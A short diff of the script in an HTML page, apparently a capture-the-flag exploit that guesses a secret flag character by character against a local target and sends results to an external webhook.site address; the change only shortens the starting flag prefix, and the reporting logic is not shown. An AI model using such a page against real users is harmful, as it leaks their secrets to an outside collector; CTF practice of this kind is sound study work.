@@ -8,7 +8,7 @@
     <script>
         const TARGET = 'http://localhost:3031'; 
         const REPORT_URL = 'https://webhook.site/c4734990-7292-43a9-97fc-54ef27ff7a64'; 
-        let flag = "RS{a"; 
+        let flag = "RS{"; 
         const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";
 
         function report(data) {
